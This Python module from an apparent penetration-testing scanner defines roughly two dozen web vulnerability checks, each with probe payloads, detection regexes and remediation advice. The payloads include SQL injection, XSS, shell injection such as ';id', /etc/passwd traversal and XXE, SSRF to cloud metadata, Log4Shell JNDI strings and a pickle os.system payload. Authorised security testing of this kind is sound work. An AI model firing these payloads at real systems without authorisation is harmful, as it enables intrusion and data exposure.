# -*- coding: utf-8 -*-
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 VULNCLAW Authors (see README & LICENSE)
# This file is part of VULNCLAW / pentest_platform.
# Licensed under GNU Affero General Public License v3.0 or later.

"""内置漏洞声明集——**新增漏洞类型就是在这里加一条数据**。

这些声明覆盖了以往需要多个独立引擎才能实现的能力（报错型注入、反射型 XSS、
时间盲注、命令注入、LFI、SSRF），全部由同一套执行器（SpecRunner）驱动，
无需为每个类型编写引擎代码。
"""
from typing import Dict, List, Optional, Tuple

from .model import from_dict


# 声明即数据：后续可整体迁移到 YAML/JSON 外部文件，代码零改动。
_BUILTIN: List[Dict] = [
    {
        "id": "sql_error",
        "name": "SQL 注入（报错型）",
        "category": "injection",
        "payloads": ["'", "\\", "1'", '1"', "')", "1')"],
        "detect": {
            "type": "regex",
            "patterns": [
                r"you have an error in your sql",
                r"sql syntax",
                r"mysql_fetch|mysqli?_",
                r"unclosed quotation mark",
                r"ora-\d{4,5}",
                r"pg_query|postgresql",
                r"sqlite|sqlite3",
                r"microsoft odbc|odbc driver",
            ],
        },
        "severity": "high",
        "cvss": 8.6,
        "confidence": "medium",
        "remediation": "使用参数化查询（预编译语句）或经过严格白名单校验的 ORM，禁止字符串拼接 SQL。",
        "recommendation": "统一数据访问层强制参数化；对错误信息脱敏，避免泄露数据库细节。",
    },
    {
        "id": "xss_reflect",
        "name": "跨站脚本（反射型）",
        "category": "xss",
        "payloads": [
            '"><script>alert(1)</script>',
            "<img src=x onerror=alert(1)>",
            "'><svg/onload=alert(1)>",
        ],
        # require_content_type：JSON 响应里回显 <script> 不会执行，
        # 不加此约束会对"原样回显输入"的接口大量误报。
        "detect": {"type": "reflect", "extra": {"core": "alert(1)"},
                   "require_content_type": "html"},
        "severity": "medium",
        "cvss": 6.1,
        "confidence": "medium",
        "remediation": "输出到 HTML 前按上下文做转义（HTML/属性/JS/URL 各自编码），并设置 CSP。",
        "recommendation": "使用模板引擎自动转义；对富文本使用白名单净化；启用 CSP 与 HttpOnly Cookie。",
    },
    {
        "id": "sqli_time_blind",
        "name": "SQL 注入（时间盲注）",
        "category": "injection",
        "payloads": ["1' AND SLEEP(3)-- ", "1 AND SLEEP(3)", "1'; WAITFOR DELAY '0:0:3'-- "],
        "detect": {"type": "time", "threshold": 2.5},
        "severity": "high",
        "cvss": 8.6,
        "confidence": "medium",
        "remediation": "使用参数化查询；限制数据库账户权限与慢查询，避免延时原语被利用。",
        "recommendation": "统一参数化；对异常耗时请求做监控告警。",
    },
    {
        "id": "cmd_injection",
        "name": "命令注入",
        "category": "rce",
        "payloads": [";id", "|id", "$(id)", "`id`", "&& id"],
        "detect": {"type": "regex", "patterns": [r"uid=\d+", r"gid=\d+", r"root:x:0:0:"]},
        "severity": "critical",
        "cvss": 9.8,
        "confidence": "high",
        "remediation": "禁止将外部输入拼接到 shell 命令；使用参数化的进程调用接口并做白名单校验。",
        "recommendation": "移除命令拼接，改用受控 API；最小权限运行服务进程。",
    },
    {
        "id": "lfi",
        "name": "本地文件包含 / 路径穿越",
        "category": "file",
        "payloads": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
        ],
        "detect": {"type": "regex", "patterns": [r"root:x:0:0:", r"/bin/(?:ba)?sh"]},
        "severity": "high",
        "cvss": 7.5,
        "confidence": "medium",
        "param_hints": ["file", "path", "page", "template", "include", "dir", "doc", "name"],
        "remediation": "禁止以用户输入拼接文件路径；使用白名单映射或规范化后校验根前缀。",
        "recommendation": "文件路径一律服务端映射；开启 open_basedir/沙箱；拒绝包含 .. 与绝对路径。",
    },
    {
        "id": "ssrf_internal",
        "name": "服务端请求伪造（SSRF / 内网探测）",
        "category": "ssrf",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:8080/",
            "http://[::1]/",
        ],
        "detect": {
            "type": "regex",
            "patterns": [r"ami-id", r"instance-id", r"169\.254\.169\.254", r"meta-data"],
        },
        "severity": "high",
        "cvss": 7.5,
        "confidence": "medium",
        "param_hints": ["url", "uri", "fetch", "target", "dest", "redirect", "proxy", "host", "site"],
        "remediation": "服务端对出站请求做白名单校验，禁止访问内网/链路本地地址与云元数据端点。",
        "recommendation": "统一出网代理并校验目标；禁用非必要协议；屏蔽 169.254.169.254 等元数据地址。",
    },
    {
        "id": "xxe",
        "name": "XML 外部实体注入（XXE）",
        "category": "xxe",
        "payloads": [
            '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>',
        ],
        "detect": {"type": "regex", "patterns": [r"root:x:0:0:", r"daemon:x:\d+", r"/bin/(?:ba)?sh"]},
        "severity": "high",
        "cvss": 7.5,
        "confidence": "medium",
        "param_hints": ["xml", "data", "body", "payload", "soap", "content", "doc"],
        "remediation": "禁用 XML 外部实体与 DTD 解析，使用安全配置的解析器。",
        "recommendation": "关闭 DTD/外部实体；优先改用 JSON；对 XML 输入做白名单校验。",
    },
    {
        "id": "ssti",
        "name": "服务端模板注入（SSTI）",
        "category": "ssti",
        "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
        "detect": {"type": "regex", "patterns": [r"\b49\b"]},
        "severity": "high",
        "cvss": 8.6,
        "confidence": "medium",
        "param_hints": ["tpl", "template", "name", "q", "view", "render", "content", "page"],
        "remediation": "禁止将用户输入拼接进模板；使用沙箱化模板引擎并转义动态内容。",
        "recommendation": "模板与数据分离；对模板变量做严格类型与白名单校验。",
    },
    {
        "id": "crlf",
        "name": "CRLF / 响应头注入",
        "category": "header_injection",
        "payloads": ["%0d%0aX-Injected:1", "\r\nX-Injected:1", "%0aSet-Cookie:%20inj=1"],
        # 判据落在**响应头**：body 里出现该字符串只是普通回显，不代表头注入
        "detect": {"type": "header", "header_name": "X-Injected", "patterns": [r".+"]},
        "severity": "medium",
        "cvss": 6.1,
        "confidence": "medium",
        "remediation": "对写入响应头的输入剥离 CR/LF；禁止用户输入直接进入头字段。",
        "recommendation": "统一头写入封装并过滤 \\r\\n；对重定向地址做白名单。",
    },
    {
        "id": "open_redirect",
        "name": "开放重定向",
        "category": "redirect",
        "payloads": ["//evil.test", "https://evil.test", "/\\\\/evil.test"],
        "detect": {"type": "reflect", "extra": {"core": "evil.test"}},
        "severity": "medium",
        "cvss": 6.1,
        "confidence": "medium",
        "param_hints": ["url", "uri", "redirect", "next", "return", "to", "goto", "target", "dest"],
        "remediation": "重定向目标做白名单校验，禁止完全由外部输入决定跳转地址。",
        "recommendation": "使用相对路径或映射 ID；对外部域名做白名单校验。",
    },
    {
        "id": "nosql_injection",
        "name": "NoSQL 注入",
        "category": "injection",
        "payloads": ['{"$gt": ""}', "' || '1'=='1", "[$ne]=1"],
        "detect": {
            "type": "regex",
            "patterns": [r"unknown operator", r"\$where", r"bson", r"Cast to ObjectId failed", r"mongo"],
        },
        "severity": "high",
        "cvss": 8.6,
        "confidence": "medium",
        "param_hints": ["q", "query", "filter", "where", "search", "id", "user", "name"],
        "remediation": "对查询参数做类型与结构校验，禁止把请求对象直接当作查询条件。",
        "recommendation": "用 schema 校验过滤 $ 开头操作符；禁用 $where 等危险操作。",
    },
    {
        "id": "ldap_injection",
        "name": "LDAP 注入",
        "category": "injection",
        "payloads": ["*", "*)(uid=*", "admin*)((|userPassword=*)"],
        "detect": {
            "type": "regex",
            "patterns": [r"invalid dn", r"javax\.naming", r"80090308", r"ldap_search", r"Bad search filter", r"search filter syntax"],
        },
        "severity": "high",
        "cvss": 7.5,
        "confidence": "low",
        "param_hints": ["user", "uid", "name", "dn", "filter", "search", "login", "account"],
        "remediation": "对 LDAP 查询参数做转义与白名单，禁止拼接过滤器。",
        "recommendation": "使用参数化 LDAP API；对 * ( ) \\ NUL 等特殊字符转义。",
    },
    {
        "id": "java_deserialization",
        "name": "Java 反序列化",
        "category": "deserialization",
        "payloads": ["rO0ABXQACkhlbGxvV29ybGQ=", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==", "aced000573720011"],
        "detect": {
            "type": "regex",
            "patterns": [r"ClassNotFoundException", r"java\.io\.", r"ObjectInputStream",
                         r"InvokerTransformer", r"org\.apache\.commons"],
        },
        "severity": "critical",
        "cvss": 9.8,
        "confidence": "medium",
        "param_hints": ["data", "obj", "object", "payload", "token", "rO0", "ser", "session"],
        "remediation": "禁止反序列化不可信数据；使用白名单类校验（ObjectInputFilter）或改用 JSON。",
        "recommendation": "升级依赖移除可利用 gadget；开启 JEP 290 过滤；对反序列化入口做鉴权。",
    },
    {
        "id": "dotnet_deserialization",
        "name": ".NET 反序列化",
        "category": "deserialization",
        "payloads": ["AAEAAAD/////AQAAAAAAAAAEAQAAABJTeXN0ZW0u", "AAEAAAD/////AQAAAAAAAAAMAgAAAF9uZXQ="],
        "detect": {
            "type": "regex",
            "patterns": [r"TypeLoadException", r"System\.Runtime\.Serialization",
                         r"BinaryFormatter", r"ObjectStateFormatter", r"System\.Web\.UI"],
        },
        "severity": "critical",
        "cvss": 9.8,
        "confidence": "medium",
        "param_hints": ["data", "obj", "viewstate", "__VIEWSTATE", "payload", "state"],
        "remediation": "禁用 BinaryFormatter/不安全的反序列化；使用安全序列化器并校验类型白名单。",
        "recommendation": "替换 BinaryFormatter；对 ViewState 启用 MAC 校验与加密。",
    },
    {
        "id": "php_object_injection",
        "name": "PHP 对象注入（反序列化）",
        "category": "deserialization",
        "payloads": ['O:8:"stdClass":0:{}', 'O:4:"Test":1:{s:4:"test";s:3:"aaa";}',
                     'a:1:{i:0;O:8:"stdClass":0:{}}'],
        "detect": {
            "type": "regex",
            "patterns": [r"unserialize\(\)", r"__PHP_Incomplete_Class",
                         r"Notice: unserialize", r"Error at offset"],
        },
        "severity": "high",
        "cvss": 8.1,
        "confidence": "medium",
        "param_hints": ["data", "obj", "payload", "ser", "cookie", "session", "value"],
        "remediation": "不要对用户可控数据调用 unserialize()；改用 json_decode 并校验结构。",
        "recommendation": "移除危险反序列化入口；对必须的场景使用 allowed_classes 限制。",
    },
    {
        "id": "python_pickle_injection",
        "name": "Python pickle 反序列化",
        "category": "deserialization",
        "payloads": ["gASV", "gASVKQAAAAAAAACMCGJ1aWx0aW5zlIwDZXZhbJSTlIwAc2VsZi5fX2NsYXNzX18=",
                     "cos\nsystem\n(S'id'\ntR."],
        "detect": {
            "type": "regex",
            "patterns": [r"UnpicklingError", r"pickle", r"__reduce__", r"invalid load key"],
        },
        "severity": "critical",
        "cvss": 9.8,
        "confidence": "medium",
        "param_hints": ["data", "obj", "payload", "pickle", "ser", "state", "session"],
        "remediation": "禁止对不可信数据使用 pickle.loads；改用 JSON 等安全格式。",
        "recommendation": "移除 pickle 反序列化入口；必须使用时校验签名与来源。",
    },
    {
        "id": "graphql_introspection",
        "name": "GraphQL 内省开放（信息泄露）",
        "category": "info_disclosure",
        "payloads": ["{__schema{types{name}}}", "{__typename}",
                     "query{__schema{queryType{name}}}"],
        "detect": {"type": "regex", "patterns": [r"__schema", r"__typename", r"Query type"],
                   "require_content_type": "json"},
        "severity": "low",
        "cvss": 5.3,
        "confidence": "medium",
        "param_hints": ["query", "q", "graphql", "data"],
        "remediation": "生产环境关闭 GraphQL 内省；对 API 增加鉴权与限流。",
        "recommendation": "按环境禁用 introspection；暴露面最小化并加访问控制。",
    },
    {
        "id": "xpath_injection",
        "name": "XPath 注入",
        "category": "injection",
        "payloads": ["' or '1'='1", "' or 1=1 or ''='", "x' | //* | 'y"],
        "detect": {
            "type": "regex",
            "patterns": [r"Invalid XPath", r"XPathException", r"xmlXPathEval",
                         r"SimpleXMLElement", r"XQuery"],
        },
        "severity": "high",
        "cvss": 7.5,
        "confidence": "medium",
        "param_hints": ["q", "query", "xpath", "search", "filter", "expr", "name"],
        "remediation": "XPath 查询参数化或对特殊字符转义，禁止拼接查询表达式。",
        "recommendation": "使用预编译 XPath 或白名单查询；对 ' \" | // 等字符转义。",
    },
    {
        "id": "log4shell",
        "name": "Log4Shell（JNDI 注入，需 OOB 复核）",
        "category": "rce",
        "payloads": ["${jndi:ldap://127.0.0.1:1389/a}", "${jndi:rmi://127.0.0.1:1099/a}",
                     "${${::-j}ndi:ldap://127.0.0.1/a}"],
        # 无 OOB 时以"JNDI 外连造成的显著延时"作为弱信号；真实确认需 OOB 回连。
        "detect": {"type": "time", "threshold": 2.0},
        "severity": "critical",
        "cvss": 10.0,
        "confidence": "low",
        "remediation": "升级 Log4j 至 2.17+；移除 JndiLookup 类；禁止日志输出执行 JNDI 查找。",
        "recommendation": "升级并移除 JndiLookup；WAF 拦截 ${jndi:；**本结论需 OOB 回连复核确认**。",
    },
    {
        "id": "cors_misconfig",
        "name": "CORS 配置不当（任意源可读取响应）",
        "category": "cors",
        "payloads": ["probe"],
        "request_headers": {"Origin": "https://evil.test"},
        "detect": {"type": "header", "header_name": "Access-Control-Allow-Origin",
                   "patterns": [r"^\*$", r"^null$", r"evil\.test"]},
        "severity": "medium",
        "cvss": 6.5,
        "confidence": "medium",
        "remediation": "Access-Control-Allow-Origin 只返回可信来源白名单，禁止通配 * 或回显任意 Origin。",
        "recommendation": "按白名单返回 ACAO；带凭证时绝不使用 *；同时限制 Allow-Methods/Headers。",
    },
    {
        "id": "missing_security_headers",
        "name": "缺失安全响应头",
        "category": "hardening",
        "payloads": ["probe"],
        "detect": {"type": "header", "header_name": "X-Content-Type-Options",
                   "header_absent": True},
        "severity": "low",
        "cvss": 3.7,
        "confidence": "high",
        "remediation": "补充 X-Content-Type-Options: nosniff（并建议 X-Frame-Options / CSP / HSTS）。",
        "recommendation": "在网关统一注入安全头；用本声明做回归校验。",
    },
    {
        "id": "host_header_injection",
        "name": "Host 头注入（X-Forwarded-Host 被拼进响应）",
        "category": "header_injection",
        "payloads": ["evil.test"],
        "request_headers": {"X-Forwarded-Host": "evil.test"},
        # 只认"被拼成 URL 主机部分"的回显；普通文本里出现 evil.test 不算
        "detect": {"type": "regex", "patterns": [r"https?://evil\.test"]},
        "severity": "medium",
        "cvss": 6.1,
        "confidence": "medium",
        "param_hints": ["url", "host", "redirect", "next", "to", "target", "q", "x"],
        "remediation": "禁止用 Host / X-Forwarded-Host 拼绝对 URL；对主机头做白名单校验。",
        "recommendation": "配置可信主机白名单；生成链接时使用站点配置域名而非请求头。",
    },
    {
        "id": "ssi_injection",
        "name": "SSI 服务端包含注入",
        "category": "injection",
        "payloads": [
            "<!--#exec cmd=\"id\"-->",
            "<!--#include virtual=\"/etc/passwd\"-->",
            "<!--#echo var=\"DATE_LOCAL\"-->",
            "<!--#config errmsg=\"x\"-->",
        ],
        "detect": {
            "type": "regex",
            "patterns": [
                r"\[an error occurred while processing this directive\]",
                r"root:x:0:0:",
                r"DATE_LOCAL",
            ],
        },
        "severity": "high",
        "cvss": 7.5,
        "confidence": "medium",
        "param_hints": ["page", "file", "template", "tpl", "include", "name", "path", "view", "section", "load"],
        "remediation": "禁用/剥离用户输入中的 SSI 指令，或关闭 SSI 解析。",
        "recommendation": "禁止将用户输入拼接进 SSI 模板；对 SSI 指令语法严格过滤。",
    },
    {
        "id": "el_injection",
        "name": "EL 表达式注入",
        "category": "injection",
        "payloads": ["${7*7}", "#{7*7}", "${''.getClass()}", "${pageContext.request.requestURI}"],
        "detect": {
            "type": "regex",
            "patterns": [
                r"javax\.el",
                r"ELException",
                r"ExpressionFactory",
                r"ELProcessor",
                r"StandardELContext",
            ],
        },
        "severity": "high",
        "cvss": 8.6,
        "confidence": "medium",
        "param_hints": ["el", "expr", "expression", "eval", "value", "data", "param", "config", "setting", "query", "search", "filter"],
        "remediation": "禁止将用户输入拼接进 EL 表达式；使用白名单校验的 EL 解析上下文。",
        "recommendation": "对 EL 解析上下文做沙箱与类白名单；避免暴露表达式入口。",
    },
    {
        "id": "rfi",
        "name": "远程文件包含（RFI）",
        "category": "file",
        "payloads": [
            "http://rfi-probe-nonexistent.invalid/x.php",
            "//rfi-probe-nonexistent.invalid/x.php",
        ],
        "detect": {
            "type": "regex",
            "patterns": [
                r"failed to open stream",
                r"getaddrinfo failed",
                r"php_network_getaddresses",
                r"include\(\): failed opening",
                r"require\(\): failed opening",
            ],
        },
        "severity": "high",
        "cvss": 8.1,
        "confidence": "medium",
        "param_hints": ["page", "file", "path", "url", "include", "require", "module", "template", "view", "doc", "load", "lang", "src"],
        "remediation": "禁止以用户输入拼接远程包含路径；关闭 allow_url_include 类特性。",
        "recommendation": "只允许包含本地白名单资源；校验协议与主机；禁用远程包装器。",
    },
]


BUILTIN_SPECS: Tuple = tuple(from_dict(d) for d in _BUILTIN)


def iter_specs(enabled_only: bool = True):
    for s in BUILTIN_SPECS:
        if enabled_only and not s.enabled:
            continue
        yield s


def get_spec(spec_id: str) -> Optional[object]:
    for s in BUILTIN_SPECS:
        if s.id == spec_id:
            return s
    return None


__all__ = ["BUILTIN_SPECS", "get_spec", "iter_specs"]
